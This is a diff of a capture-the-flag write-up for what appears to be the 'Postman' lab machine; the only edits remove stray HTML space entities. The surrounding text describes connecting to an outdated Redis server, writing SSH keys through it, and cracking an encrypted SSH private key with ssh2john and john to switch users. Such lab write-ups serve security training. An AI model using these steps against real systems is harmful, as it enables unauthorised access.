@@ -21,7 +21,7 @@ Redis is open interestingly. So we can try to check for vulnerabilities there fi
 
 ### SSH Key Write
 
-We can connect to Redis using `redis-cli`.&#x20;
+We can connect to Redis using `redis-cli`.
 
 ```
 $ redis-cli -h 10.129.2.1
@@ -30,7 +30,7 @@ $ redis-cli -h 10.129.2.1
 redis_version:4.0.9
 ```
 
-The Redis version is really outdated, so we can try to find some exploits regarding it. Hacktricks has some methods of exploiting this by writing SSH keys.&#x20;
+The Redis version is really outdated, so we can try to find some exploits regarding it. Hacktricks has some methods of exploiting this by writing SSH keys.
 
 {% embed url="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh" %}
 
@@ -67,7 +67,7 @@ drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
 drwxr-xr-x  6 Matt Matt 4096 Sep 11  2019 Matt
 ```
 
-Within the `/opt` directory, there's a password encrypted `id_rsa` file.&#x20;
+Within the `/opt` directory, there's a password encrypted `id_rsa` file.
 
 ```
 redis@Postman:/opt$ ls -la
@@ -77,7 +77,7 @@ drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
 -rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
 ```
 
-We can download this back to our machine and use `ssh2john` and `john` to crack it.&#x20;
+We can download this back to our machine and use `ssh2john` and `john` to crack it.
 
 ```
 $ ssh2john id_rsa.bak > hash.txt
@@ -94,7 +94,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-Great! We now have a password for the user. We can use `su` to change from `redis` to `Matt`.&#x20;
+Great! We now have a password for the user. We can use `su` to change from `redis` to `Matt`.
 
 <figure><img src="../../../.gitbook/assets/image (3221).png" alt=""><figcaption></figcaption></figure>
 
